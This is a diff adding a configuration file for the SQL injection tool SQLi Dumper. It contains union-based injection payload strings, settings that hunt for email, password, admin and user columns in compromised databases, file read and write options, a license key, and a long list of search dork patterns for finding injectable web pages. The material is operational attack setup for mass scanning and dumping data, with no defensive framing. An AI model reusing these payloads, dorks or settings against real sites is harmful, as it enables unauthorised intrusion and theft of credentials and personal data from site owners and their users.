@@ -1,0 +1,461 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<SQLi_Dumper>
+  <Section Name="LIC">
+    <Key Name="KEY" Value="FR5724C5DC635C848913AB310E60FEA8B861C9CF57" />
+  </Section>
+  <Section Name="frmScanner">
+    <Key Name="txtSearchAPI_19" Value="" />
+    <Key Name="txtAnalizerUnion5" Value="999999.9&quot; union all select [t] and &quot;0&quot;=&quot;0" />
+    <Key Name="chkMultiSearch_6" Value="True" />
+    <Key Name="txtAnalizerUnion6" Value="999999.9) union all select [t] and (0=0" />
+    <Key Name="txtAnalizerUnion3" Value="999999.9 union all select [t]--" />
+    <Key Name="chkAnalizeAlexa" Value="True" />
+    <Key Name="chkMultiSearch_8" Value="True" />
+    <Key Name="grbInjectables" Value="True" />
+    <Key Name="chkAnalizeColumnsCurrDB" Value="True" />
+    <Key Name="numSearchDelay" Value="1000" />
+    <Key Name="txtSearchAPI_9" Value="" />
+    <Key Name="chkInjectableCheckColumns1" Value="True" />
+    <Key Name="chkMultiSearch_10" Value="True" />
+    <Key Name="chkInjectableCheckColumns4" Value="False" />
+    <Key Name="txtSearchAPI_7" Value="" />
+    <Key Name="txtSearchAPI_2" Value="" />
+    <Key Name="txtSearchAPI_14" Value="" />
+    <Key Name="txtInjectableCheckColumns3" Value="password" />
+    <Key Name="txtSearchAPI_18" Value="" />
+    <Key Name="chkMultiSearch_1" Value="True" />
+    <Key Name="txtSearchAPI_16" Value="" />
+    <Key Name="chkAnalizerMySQLErrorUnion" Value="True" />
+    <Key Name="txtSearchAPI_12" Value="" />
+    <Key Name="chkMultiSearch_3" Value="True" />
+    <Key Name="chkMultiSearch_5" Value="True" />
+    <Key Name="txtSearchAPI_8" Value="" />
+    <Key Name="chkInjectableCheckColumns3" Value="False" />
+    <Key Name="txtSearchAPI_6" Value="" />
+    <Key Name="txtSearchSummary" Value="" />
+    <Key Name="txtSearchAPI_1" Value="inurl:" />
+    <Key Name="txtAnalizerUnion4" Value="999999.9' union all select [t] and '0'='0--" />
+    <Key Name="chkMultiSearch_7" Value="True" />
+    <Key Name="txtAnalizerUnion1" Value="999999.9 union all select [t]" />
+    <Key Name="chkAnalizerIntencive" Value="False" />
+    <Key Name="txtInjectableCheckColumns4" Value="user" />
+    <Key Name="txtAnalizerUnion2" Value="999999.9' union all select [t] and '0'='0" />
+    <Key Name="txtSearchAPI_10" Value="" />
+    <Key Name="txtInjectableCheckColumns2" Value="admin" />
+    <Key Name="txtExcludeUrlWords" Value="showthread;injection;dorks;union;hack;.gov" />
+    <Key Name="chkMultiSearch_9" Value="True" />
+    <Key Name="chkAnalizerUnion4" Value="False" />
+    <Key Name="chkAnalizerUnion5" Value="False" />
+    <Key Name="chkAnalizerUnion6" Value="False" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="chkAnalizerUnion3" Value="True" />
+    <Key Name="chkAnalizerUnion2" Value="True" />
+    <Key Name="chkAnalizerUnion1" Value="True" />
+    <Key Name="txtSearchAPI_15" Value="" />
+    <Key Name="txtMultiDorks" Value="wwe.flv?avd=&#xD;&#xA;wwe.html?login_id=&#xD;&#xA;wwecfmcat=&#xD;&#xA;wweproducts/?sec=&#xD;&#xA;wwe.aspuser_id=&#xD;&#xA;wwecfmparam=&#xD;&#xA;wwe.raw?game_id=&#xD;&#xA;wwe.raw?type_id=&#xD;&#xA;wwe.aspcoID=&#xD;&#xA;wwe.File?page_id=&#xD;&#xA;wwe.ashx?user_id=&#xD;&#xA;wweaspgamer_id=&#xD;&#xA;wwe.php3?login_id=&#xD;&#xA;wwecfmtype_id=&#xD;&#xA;wwe.pdf?param=&#xD;&#xA;wwe.File?sec=&#xD;&#xA;wwe.jsf?register=&#xD;&#xA;wwe.php3?panel=&#xD;&#xA;wwe.psml?gamer_id=&#xD;&#xA;wwe.psml?panel=&#xD;&#xA;wwe.aspgame_id=&#xD;&#xA;wwe.jsf?login_id=&#xD;&#xA;wwe.pdf?page_id=&#xD;&#xA;wwecfmpanel=&#xD;&#xA;wwecat/?avd=&#xD;&#xA;wwe.pdf?category=&#xD;&#xA;wwe.jsf?item_id=&#xD;&#xA;wwecat/?cat=&#xD;&#xA;wwe.tss?login_id=&#xD;&#xA;wweproducts/?product_id=&#xD;&#xA;wwe.blog?id=&#xD;&#xA;wweevents?cat=&#xD;&#xA;wwephpx?coID=&#xD;&#xA;wwecontact us?param=&#xD;&#xA;wwe.php3?id=&#xD;&#xA;wweproducts/?gamer_id=&#xD;&#xA;wwe.raw?include=&#xD;&#xA;wwe.ashx?avd=&#xD;&#xA;wwe.flv?id=&#xD;&#xA;wwe.cfmpanel=&#xD;&#xA;wwe.flv?item_id=&#xD;&#xA;wwe.flv?username_id=&#xD;&#xA;wwe.jsp?register=&#xD;&#xA;wwe.pdf?include=&#xD;&#xA;wwecfmcategory=&#xD;&#xA;wwe.tss?register=&#xD;&#xA;wwecat/?game_id=&#xD;&#xA;wwe.cfm?cat=&#xD;&#xA;wweblog/?login_id=&#xD;&#xA;wweaspx?param=&#xD;&#xA;wwe.blog?type_id=&#xD;&#xA;wwe.psml?include=&#xD;&#xA;wwe.phtml?user_id=&#xD;&#xA;wwe.htm?login_id=&#xD;&#xA;wwe.raw?category=&#xD;&#xA;wwe.flv?coID=&#xD;&#xA;wwe.pdf?type=&#xD;&#xA;wweblog/?include=&#xD;&#xA;wwephpx?product_id=&#xD;&#xA;wweblog/?avd=&#xD;&#xA;wweaspitem_id=&#xD;&#xA;wweaspcat=&#xD;&#xA;wwe.phtml?purchase_id=&#xD;&#xA;wweproducts/?type=&#xD;&#xA;wwephpx?panel=&#xD;&#xA;wwe.raw?purchase_id=&#xD;&#xA;wweaspx?game_id=&#xD;&#xA;wweblog/?type_id=&#xD;&#xA;wwe.htm?purchase_id=&#xD;&#xA;wwe.flv?login_id=&#xD;&#xA;wwe.jsf?purchase_id=&#xD;&#xA;wweaspx?page_id=&#xD;&#xA;wwecfmsec=&#xD;&#xA;wwe.php?id=&#xD;&#xA;wwe.jsp?user_id=&#xD;&#xA;wwe.File?game_id=&#xD;&#xA;wwe.php3?gamer_id=&#xD;&#xA;wwe.raw?avd=&#xD;&#xA;wwe.php4?cat=&#xD;&#xA;wwe.tss?param=&#xD;&#xA;wwe.html?sec=&#xD;&#xA;wwe.aspx?type_id=&#xD;&#xA;wwecfmpage_id=&#xD;&#xA;wwe.raw?gamer_id=&#xD;&#xA;wwe.flv?purchase_id=&#xD;&#xA;wwecontact us?id=&#xD;&#xA;wweaspx?id=&#xD;&#xA;wwe.jsf?param=&#xD;&#xA;wweblog/?item_id=&#xD;&#xA;wwe.tss?include=&#xD;&#xA;wwe.pdf?product_id=&#xD;&#xA;wwe.htm?sec=&#xD;&#xA;wwe.aspx?gamer_id=&#xD;&#xA;wwe.flv?game_id=&#xD;&#xA;wwe.phtml?type_id=&#xD;&#xA;wweaspx?sec=&#xD;&#xA;wwe.flv?type=&#xD;&#xA;wwe.psml?param=&#xD;&#xA;wwe.html?product_id=&#xD;&#xA;wwe.php4?login_id=&#xD;&#xA;wwe.File?purchase_id=&#xD;&#xA;wwe.raw?cat=&#xD;&#xA;wwe.htm?panel=&#xD;&#xA;wwe.asppurchase_id=&#xD;&#xA;wwe.phpsec=&#xD;&#xA;wwe.phtml?avd=&#xD;&#xA;wwephpx?id=&#xD;&#xA;wwe.ashx?coID=&#xD;&#xA;wwecfmtype=&#xD;&#xA;wwephpx?gamer_id=&#xD;&#xA;wwe.cfm?register=&#xD;&#xA;wwe.aspgamer_id=&#xD;&#xA;wwecat/?type_id=&#xD;&#xA;wwe.aspx?username_id=&#xD;&#xA;wwe.jsp?id=&#xD;&#xA;wwe.tss?user_id=&#xD;&#xA;wwe.asp?user_id=&#xD;&#xA;wwe.jsf?cat=&#xD;&#xA;wwe.cgi?avd=&#xD;&#xA;wwecontact us?user_id=&#xD;&#xA;wwe.tss?type=&#xD;&#xA;wwe.asp?type_id=&#xD;&#xA;wwe.php?game_id=&#xD;&#xA;wwe.File?user_id=&#xD;&#xA;wwe.php4?category=&#xD;&#xA;wwe.cfm?purchase_id=&#xD;&#xA;wwe.phtml?id=&#xD;&#xA;wweproducts/?item_id=&#xD;&#xA;wwe.aspx?login_id=&#xD;&#xA;wwecat/?panel=&#xD;&#xA;wwecfmuser_id=&#xD;&#xA;wwe.asp?game_id=&#xD;&#xA;wwe.phtml?coID=&#xD;&#xA;wwe.phpid=&#xD;&#xA;wwe.aspx?include=&#xD;&#xA;wweproducts/?avd=&#xD;&#xA;wwe.php?product_id=&#xD;&#xA;wwe.tss?sec=&#xD;&#xA;wweasppurchase_id=&#xD;&#xA;wwe.aspregister=&#xD;&#xA;wweproducts/?game_id=&#xD;&#xA;wwe.html?param=&#xD;&#xA;wwe.phtml?username_id=&#xD;&#xA;wwe.cgi?user_id=&#xD;&#xA;wwesite/?param=&#xD;&#xA;wwe.psml?category=&#xD;&#xA;wwecfmid=&#xD;&#xA;wwe.cgi?game_id=&#xD;&#xA;wwe.jsf?user_id=&#xD;&#xA;wwecat/?page_id=&#xD;&#xA;wweproducts/?user_id=&#xD;&#xA;wwecfmcoID=&#xD;&#xA;wwesite/?purchase_id=&#xD;&#xA;wwe.php3?user_id=&#xD;&#xA;wwe.aspx?param=&#xD;&#xA;wwe.jsf?product_id=&#xD;&#xA;wwecontact us?login_id=&#xD;&#xA;wwe.File?register=&#xD;&#xA;wwe.cfm?page_id=&#xD;&#xA;wwecat/?item_id=&#xD;&#xA;wwe.raw?coID=&#xD;&#xA;wwe.jsp?item_id=&#xD;&#xA;wwe.phptype=&#xD;&#xA;wwecontact us?register=&#xD;&#xA;wwe.jsf?coID=&#xD;&#xA;wwe.htm?id=&#xD;&#xA;wweaspcategory=&#xD;&#xA;wweblog/?panel=&#xD;&#xA;wwe.phtml?product_id=&#xD;&#xA;wwe.blog?include=&#xD;&#xA;wwe.html?type_id=&#xD;&#xA;wwe.jsf?game_id=&#xD;&#xA;wwe.jsp?coID=&#xD;&#xA;wweproducts/?type_id=&#xD;&#xA;wweproducts/?include=&#xD;&#xA;wwe.asp?type=&#xD;&#xA;wwecfmpurchase_id=&#xD;&#xA;wwe.jsf?sec=&#xD;&#xA;wwe.phpproduct_id=&#xD;&#xA;wwe.jsp?page_id=&#xD;&#xA;wwe.raw?user_id=&#xD;&#xA;wweevents?avd=&#xD;&#xA;wwe.pdf?sec=&#xD;&#xA;wwe.aspx?coID=&#xD;&#xA;wwe.htm?avd=&#xD;&#xA;wwe.cgi?register=&#xD;&#xA;wweevents?sec=&#xD;&#xA;wwe.cfm?sec=&#xD;&#xA;wwe.aspx?panel=&#xD;&#xA;wweaspx?item_id=&#xD;&#xA;wwe.pdf?username_id=&#xD;&#xA;wwe.php4?param=&#xD;&#xA;wwe.blog?avd=&#xD;&#xA;wwe.jsp?include=&#xD;&#xA;wwe.File?category=&#xD;&#xA;wwe.html?panel=&#xD;&#xA;wweasppanel=&#xD;&#xA;wweevents?coID=&#xD;&#xA;wwe.phpcat=&#xD;&#xA;wwe.aspx?avd=&#xD;&#xA;wwecat/?sec=&#xD;&#xA;wwe.File?type_id=&#xD;&#xA;wwe.php4?id=&#xD;&#xA;wwe.html?type=&#xD;&#xA;wwe.asp?register=&#xD;&#xA;wwe.blog?register=&#xD;&#xA;wwe.raw?id=&#xD;&#xA;wwe.jsp?cat=&#xD;&#xA;wwe.psml?cat=&#xD;&#xA;wwe.tss?cat=&#xD;&#xA;wwephpx?sec=&#xD;&#xA;wwe.jsp?type=&#xD;&#xA;wwe.flv?page_id=&#xD;&#xA;wwe.phtml?category=&#xD;&#xA;wweaspavd=&#xD;&#xA;wwe.raw?type=&#xD;&#xA;wwe.pdf?type_id=&#xD;&#xA;wweasppage_id=&#xD;&#xA;wwesite/?login_id=&#xD;&#xA;wweaspx?user_id=&#xD;&#xA;wweaspx?username_id=&#xD;&#xA;wwe.blog?type=&#xD;&#xA;wwe.php3?product_id=&#xD;&#xA;wwe.flv?user_id=&#xD;&#xA;wwe.php3?sec=&#xD;&#xA;wwe.phpcategory=&#xD;&#xA;wwe.blog?game_id=&#xD;&#xA;wwe.htm?register=&#xD;&#xA;wwe.htm?product_id=&#xD;&#xA;wwe.flv?type_id=&#xD;&#xA;wwecat/?login_id=&#xD;&#xA;wwe.php?panel=&#xD;&#xA;wwe.asplogin_id=&#xD;&#xA;wwe.aspparam=&#xD;&#xA;wwe.cfm?coID=&#xD;&#xA;wwesite/?sec=&#xD;&#xA;wwecfmusername_id=&#xD;&#xA;wwecontact us?username_id=&#xD;&#xA;wwe.php3?username_id=&#xD;&#xA;wwe.raw?username_id=&#xD;&#xA;wwe.jsf?id=&#xD;&#xA;wwe.html?page_id=&#xD;&#xA;wwe.flv?include=&#xD;&#xA;wwe.asptype_id=&#xD;&#xA;wwe.php3?category=&#xD;&#xA;wweaspx?cat=&#xD;&#xA;wwecontact us?panel=&#xD;&#xA;wweaspuser_id=&#xD;&#xA;wwe.File?login_id=&#xD;&#xA;wweevents?panel=&#xD;&#xA;wwe.phpparam=&#xD;&#xA;wwecat/?purchase_id=&#xD;&#xA;wwe.jsf?type=&#xD;&#xA;wwephpx?game_id=&#xD;&#xA;wwe.pdf?cat=&#xD;&#xA;wwe.cgi?category=&#xD;&#xA;wwe.ashx?purchase_id=&#xD;&#xA;wweevents?id=&#xD;&#xA;wwe.html?avd=&#xD;&#xA;wwe.psml?type=&#xD;&#xA;wwe.jsp?login_id=&#xD;&#xA;wwe.phplogin_id=&#xD;&#xA;wwe.cfmtype_id=&#xD;&#xA;wwe.phtml?login_id=&#xD;&#xA;wwe.pdf?avd=&#xD;&#xA;wwe.html?cat=&#xD;&#xA;wwe.pdf?login_id=&#xD;&#xA;wweevents?page_id=&#xD;&#xA;wwe.phtml?include=&#xD;&#xA;wweevents?user_id=&#xD;&#xA;wwe.php3?page_id=&#xD;&#xA;wwe.pdf?gamer_id=&#xD;&#xA;wweaspparam=&#xD;&#xA;wwe.phtml?cat=&#xD;&#xA;wwecontact us?coID=&#xD;&#xA;wwe.jsf?panel=&#xD;&#xA;wwe.File?cat=&#xD;&#xA;wwe.php4?panel=&#xD;&#xA;wwe.File?id=&#xD;&#xA;wwe.blog?item_id=&#xD;&#xA;wweblog/?purchase_id=&#xD;&#xA;wwe.aspx?page_id=&#xD;&#xA;wweaspx?register=&#xD;&#xA;wwe.phpitem_id=&#xD;&#xA;wweevents?include=&#xD;&#xA;wwe.asp?product_id=&#xD;&#xA;wwe.jsf?category=&#xD;&#xA;wweblog/?category=&#xD;&#xA;wwe.File?include=&#xD;&#xA;wweaspx?purchase_id=&#xD;&#xA;wwe.php4?purchase_id=&#xD;&#xA;wwe.raw?page_id=&#xD;&#xA;wwecfmlogin_id=&#xD;&#xA;wwe.cfmusername_id=&#xD;&#xA;wwe.html?coID=&#xD;&#xA;wwe.flv?cat=&#xD;&#xA;wweaspgame_id=&#xD;&#xA;wwe.php3?avd=&#xD;&#xA;wwe.flv?sec=&#xD;&#xA;wwe.pdf?item_id=&#xD;&#xA;wwe.aspx?id=&#xD;&#xA;wwe.phpuser_id=&#xD;&#xA;wwe.jsp?username_id=&#xD;&#xA;wwe.pdf?register=&#xD;&#xA;wwe.htm?category=&#xD;&#xA;wwe.flv?register=&#xD;&#xA;wwe.php4?user_id=&#xD;&#xA;wwe.html?register=&#xD;&#xA;wweaspx?type_id=&#xD;&#xA;wwe.php4?type=&#xD;&#xA;wwe.aspinclude=&#xD;&#xA;wwe.aspx?user_id=&#xD;&#xA;wwe.jsp?sec=&#xD;&#xA;wwe.File?product_id=&#xD;&#xA;wwesite/?id=&#xD;&#xA;wweaspx?category=&#xD;&#xA;wwe.cgi?param=&#xD;&#xA;wweblog/?register=&#xD;&#xA;wwecat/?register=&#xD;&#xA;wwe.jsf?include=&#xD;&#xA;wwe.flv?panel=&#xD;&#xA;wwe.cfmpage_id=&#xD;&#xA;wwe.blog?coID=&#xD;&#xA;wwesite/?include=&#xD;&#xA;wwe.cfmuser_id=&#xD;&#xA;wwe.cgi?panel=&#xD;&#xA;wweblog/?id=&#xD;&#xA;wweblog/?param=&#xD;&#xA;wwe.pdf?user_id=&#xD;&#xA;wwe.File?panel=&#xD;&#xA;wwe.File?username_id=&#xD;&#xA;wwe.cfmregister=&#xD;&#xA;wwe.cfmid=&#xD;&#xA;wwe.phpregister=&#xD;&#xA;wwe.cfm?product_id=&#xD;&#xA;wwe.blog?purchase_id=&#xD;&#xA;wwesite/?cat=&#xD;&#xA;wwe.cfm?avd=&#xD;&#xA;wwecat/?user_id=&#xD;&#xA;wwe.pdf?game_id=&#xD;&#xA;wwe.cfm?type_id=&#xD;&#xA;wweaspsec=&#xD;&#xA;wwe.cfmcoID=&#xD;&#xA;wwe.htm?param=&#xD;&#xA;wwe.html?username_id=&#xD;&#xA;wwecat/?category=&#xD;&#xA;wwe.blog?panel=&#xD;&#xA;wweproducts/?id=&#xD;&#xA;wwe.php3?type_id=&#xD;&#xA;wwecontact us?product_id=&#xD;&#xA;wweaspid=&#xD;&#xA;wwe.pdf?id=&#xD;&#xA;wwe.phpcoID=&#xD;&#xA;wwe.ashx?type_id=&#xD;&#xA;wwe.cfmitem_id=&#xD;&#xA;wwe.html?include=&#xD;&#xA;wwe.htm?type_id=&#xD;&#xA;wwe.asp?avd=&#xD;&#xA;wwe.ashx?sec=&#xD;&#xA;wwephpx?item_id=&#xD;&#xA;wwe.pdf?coID=&#xD;&#xA;wwe.flv?category=&#xD;&#xA;wwe.ashx?product_id=&#xD;&#xA;wweevents?product_id=&#xD;&#xA;wwecat/?include=&#xD;&#xA;wwe.tss?item_id=&#xD;&#xA;wweproducts/?coID=&#xD;&#xA;wweblog/?cat=&#xD;&#xA;wwe.cgi?type=&#xD;&#xA;wwecfmavd=&#xD;&#xA;wwe.asp?purchase_id=&#xD;&#xA;wwe.htm?type=&#xD;&#xA;wwephpx?login_id=&#xD;&#xA;wwe.raw?sec=&#xD;&#xA;wwe.phtml?type=&#xD;&#xA;wwe.php4?page_id=&#xD;&#xA;wwephpx?username_id=&#xD;&#xA;wwe.phtml?panel=&#xD;&#xA;wwe.cfmcat=&#xD;&#xA;wwe.php?include=&#xD;&#xA;wwe.cfm?user_id=&#xD;&#xA;wwe.raw?item_id=&#xD;&#xA;wwe.cfmcategory=&#xD;&#xA;wwe.psml?username_id=&#xD;&#xA;wwe.cgi?username_id=&#xD;&#xA;wwesite/?category=&#xD;&#xA;wweasptype=&#xD;&#xA;wwe.php3?cat=&#xD;&#xA;wwe.tss?panel=&#xD;&#xA;wwe.cgi?purchase_id=&#xD;&#xA;wwe.tss?avd=&#xD;&#xA;wwe.aspcat=&#xD;&#xA;wwe.aspx?category=&#xD;&#xA;wweevents?username_id=&#xD;&#xA;wwe.asp?login_id=&#xD;&#xA;wwe.blog?cat=&#xD;&#xA;wwe.jsf?type_id=&#xD;&#xA;wwe.htm?game_id=&#xD;&#xA;wwe.php3?coID=&#xD;&#xA;wwe.jsf?page_id=&#xD;&#xA;wwe.blog?gamer_id=&#xD;&#xA;wwe.php3?purchase_id=&#xD;&#xA;wwe.php4?game_id=&#xD;&#xA;wwe.psml?product_id=&#xD;&#xA;wwe.aspx?cat=&#xD;&#xA;wwe.tss?username_id=&#xD;&#xA;wwe.flv?gamer_id=&#xD;&#xA;wwe.psml?id=&#xD;&#xA;wwesite/?register=&#xD;&#xA;wwephpx?category=&#xD;&#xA;wwecontact us?include=&#xD;&#xA;wwe.php4?sec=&#xD;&#xA;wwe.aspproduct_id=&#xD;&#xA;wwe.ashx?page_id=&#xD;&#xA;wwe.jsp?param=&#xD;&#xA;wwe.asp?include=&#xD;&#xA;wwe.aspid=&#xD;&#xA;wwe.tss?id=&#xD;&#xA;wwe.php?param=&#xD;&#xA;wwe.blog?param=&#xD;&#xA;wwesite/?user_id=&#xD;&#xA;wwe.php4?register=&#xD;&#xA;wweaspregister=&#xD;&#xA;wweblog/?page_id=&#xD;&#xA;wwe.htm?item_id=&#xD;&#xA;wwe.jsp?category=&#xD;&#xA;wwesite/?item_id=&#xD;&#xA;wwe.aspx?game_id=&#xD;&#xA;wwe.php4?item_id=&#xD;&#xA;wwe.phpinclude=&#xD;&#xA;wwe.aspitem_id=&#xD;&#xA;wweaspcoID=&#xD;&#xA;wwecfmgamer_id=&#xD;&#xA;wwe.tss?coID=&#xD;&#xA;wweaspx?coID=&#xD;&#xA;wwe.php?sec=&#xD;&#xA;wweproducts/?panel=&#xD;&#xA;wwecontact us?category=&#xD;&#xA;wwe.htm?page_id=&#xD;&#xA;wwe.aspx?item_id=&#xD;&#xA;wwecontact us?type=&#xD;&#xA;wwe.raw?param=&#xD;&#xA;wwe.pdf?panel=&#xD;&#xA;wwe.asp?coID=&#xD;&#xA;wwe.tss?gamer_id=&#xD;&#xA;wwe.cfmsec=&#xD;&#xA;wwe.php4?include=&#xD;&#xA;wwe.cgi?sec=&#xD;&#xA;wwe.php?coID=&#xD;&#xA;wwe.tss?product_id=&#xD;&#xA;wweproducts/?register=&#xD;&#xA;wwe.php?cat=&#xD;&#xA;wwe.php3?item_id=&#xD;&#xA;wwesite/?type_id=&#xD;&#xA;wwecat/?id=&#xD;&#xA;wweevents?purchase_id=&#xD;&#xA;wwe.phppage_id=&#xD;&#xA;wwe.phptype_id=&#xD;&#xA;wwe.psml?user_id=&#xD;&#xA;wwecat/?param=&#xD;&#xA;wwe.cfminclude=&#xD;&#xA;wwe.tss?purchase_id=&#xD;&#xA;wweblog/?user_id=&#xD;&#xA;wwe.tss?game_id=&#xD;&#xA;wwe.asptype=&#xD;&#xA;wwe.psml?register=&#xD;&#xA;wwe.php?type_id=&#xD;&#xA;wwe.jsf?username_id=&#xD;&#xA;wwe.phtml?page_id=&#xD;&#xA;wwe.cfm?gamer_id=&#xD;&#xA;wweblog/?coID=&#xD;&#xA;wweaspx?avd=&#xD;&#xA;wwe.ashx?username_id=&#xD;&#xA;wwe.blog?sec=&#xD;&#xA;wwe.File?gamer_id=&#xD;&#xA;wwe.psml?page_id=&#xD;&#xA;wwecat/?coID=&#xD;&#xA;wwephpx?param=&#xD;&#xA;wwe.cfm?category=&#xD;&#xA;wwephpx?cat=&#xD;&#xA;wwe.File?coID=&#xD;&#xA;wweevents?param=&#xD;&#xA;wwe.File?item_id=&#xD;&#xA;wwe.php?item_id=&#xD;&#xA;wwecfmregister=&#xD;&#xA;wwe.tss?type_id=&#xD;&#xA;wwe.blog?product_id=&#xD;&#xA;wweaspinclude=&#xD;&#xA;wwe.cfm?game_id=&#xD;&#xA;wwe.aspcategory=&#xD;&#xA;wwecontact us?cat=&#xD;&#xA;wwe.raw?product_id=&#xD;&#xA;wwe.html?user_id=&#xD;&#xA;wwe.asp?username_id=&#xD;&#xA;wwe.ashx?register=&#xD;&#xA;wwecat/?type=&#xD;&#xA;wwe.phpgamer_id=&#xD;&#xA;wwecfmgame_id=&#xD;&#xA;wwe.php4?gamer_id=&#xD;&#xA;wwe.phpgame_id=&#xD;&#xA;wwe.ashx?game_id=&#xD;&#xA;wwe.jsf?gamer_id=&#xD;&#xA;wwecontact us?game_id=&#xD;&#xA;wwe.aspx?register=&#xD;&#xA;wwesite/?product_id=&#xD;&#xA;wwe.File?type=&#xD;&#xA;wwe.htm?gamer_id=&#xD;&#xA;wwe.php3?game_id=&#xD;&#xA;wwecat/?gamer_id=&#xD;&#xA;wwesite/?panel=&#xD;&#xA;wwecfminclude=&#xD;&#xA;" />
+    <Key Name="chkAnalizeLoad_File" Value="True" />
+    <Key Name="txtSearchAPI_11" Value="" />
+    <Key Name="grbSearchColumns" Value="True" />
+    <Key Name="chkAnalizerMSSQLErrorUnion" Value="False" />
+    <Key Name="chkAnalizeWrite_File" Value="True" />
+    <Key Name="cmbInjectableSearchType" Value="Columns" />
+    <Key Name="txtSearchAPI_17" Value="" />
+    <Key Name="txtSearchAPI_13" Value="" />
+    <Key Name="chkInjectableCheckColumns2" Value="False" />
+    <Key Name="txtSearchAPI_5" Value="" />
+    <Key Name="chkMultiSearch_2" Value="True" />
+    <Key Name="txtSearchAPI_3" Value="" />
+    <Key Name="numAnalizerUnionEnd" Value="35" />
+    <Key Name="txtInjectableCheckColumns1" Value="email" />
+    <Key Name="txtSearchAPI_20" Value="" />
+    <Key Name="txtSearchAPI_4" Value="" />
+    <Key Name="chkMultiSearch_4" Value="True" />
+    <Key Name="__cThreadsScanner" Value="10" />
+    <Key Name="__cThreadsExploiter" Value="30" />
+    <Key Name="__cThreadsAnalizer" Value="10" />
+    <Key Name="grbBack" Value="False" />
+  </Section>
+  <Section Name="frmAnalizer">
+    <Key Name="txtAnalizerUnion7" Value="999999.9 union all select [t] #" />
+    <Key Name="numSQLi" Value="1" />
+    <Key Name="txtReqHeaders" Value="" />
+    <Key Name="chkUnionInMSSQLError" Value="False" />
+    <Key Name="txtURL_Builded" Value="" />
+    <Key Name="grbRequest" Value="True" />
+    <Key Name="txtAnalizerMethod" Value="" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="grbHeaders" Value="True" />
+    <Key Name="rdbAnalizerInject4" Value="False" />
+    <Key Name="rdbAnalizerInject3" Value="False" />
+    <Key Name="rdbType_2" Value="False" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="tkbAnalizerThreads" Value="5" />
+    <Key Name="numAnalizerUnionEnd" Value="20" />
+    <Key Name="txtReqCookies" Value="" />
+    <Key Name="grbSQLi" Value="True" />
+    <Key Name="cmbAnalizerType" Value="Automatic" />
+    <Key Name="txtRequest" Value="" />
+    <Key Name="chkIEBrowser" Value="True" />
+    <Key Name="grbAnalizer" Value="True" />
+    <Key Name="grbCookies" Value="True" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkConvertHex" Value="False" />
+    <Key Name="txtAnalizerUnion8" Value="999999.9' union all select [t] and '0'='0 #" />
+    <Key Name="txtAnalizerUnion5" Value="999999.9&quot; union all select [t] and &quot;0&quot;=&quot;0" />
+    <Key Name="txtAnalizerUnion4" Value="999999.9' union all select [t] and '0'='0--" />
+    <Key Name="txtAnalizerUnion6" Value="999999.9) union all select [t] and (0=0" />
+    <Key Name="txtAnalizerUnion1" Value="999999.9 union all select [t]" />
+    <Key Name="rdbAnalizerInject1" Value="True" />
+    <Key Name="txtAnalizerUnion3" Value="999999.9 union all select [t]--" />
+    <Key Name="txtAnalizerUnion2" Value="999999.9' union all select [t] and '0'='0" />
+    <Key Name="chkAnalizerUnion5" Value="False" />
+    <Key Name="chkAnalizerUnion3" Value="True" />
+    <Key Name="chkAnalizerUnion2" Value="True" />
+    <Key Name="chkUnionInMySQLError" Value="True" />
+    <Key Name="chkAnalizerUnion6" Value="False" />
+    <Key Name="chkAnalizerUnion7" Value="False" />
+    <Key Name="chkAnalizerUnion4" Value="True" />
+    <Key Name="rdbAnalizerInject2" Value="False" />
+    <Key Name="chkUnionKeyword" Value="True" />
+    <Key Name="txtCustom" Value="~SQLI:[t]~" />
+    <Key Name="chkAnalizerUnion1" Value="True" />
+    <Key Name="txtAnalizerTraject" Value="" />
+    <Key Name="chkAnalizerUnion8" Value="False" />
+    <Key Name="cmbSQLi" Value="union all select [t]" />
+    <Key Name="chkErrorBasead" Value="True" />
+    <Key Name="grbHTTP" Value="False" />
+    <Key Name="rdbType_1" Value="True" />
+    <Key Name="rdbType_3" Value="False" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="chkTraject" Value="False" />
+    <Key Name="rdbAnalizerInject5" Value="False" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkUnionInteger" Value="True" />
+  </Section>
+  <Section Name="frmDumpArea">
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="numLimitY" Value="1" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="rdbMySQLCollactions1" Value="False" />
+    <Key Name="rdbMySQLCollactions3" Value="False" />
+    <Key Name="tkbThreads" Value="10" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="trwSchema" Value="_Central               [? ]" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="grbOracleTopN" Value="False" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="grbMySQLCollactions" Value="False" />
+    <Key Name="rdbMySQLCollactions6" Value="False" />
+    <Key Name="txtSchemaOrderBy" Value="1 asc, 2 desc" />
+    <Key Name="rdbMySQLCollactions2" Value="False" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="rdbOracleErrorType2" Value="False" />
+    <Key Name="rdbOracleTopN_2" Value="False" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="rdbMySQLCollactions4" Value="False" />
+    <Key Name="grbLimits" Value="False" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="rdbOracleTopN_3" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="rdbMySQLErrorType1" Value="True" />
+    <Key Name="rdbMySQLErrorType2" Value="False" />
+    <Key Name="cmbSqlType" Value="MS SQL Error" />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="numMaxRetry" Value="5" />
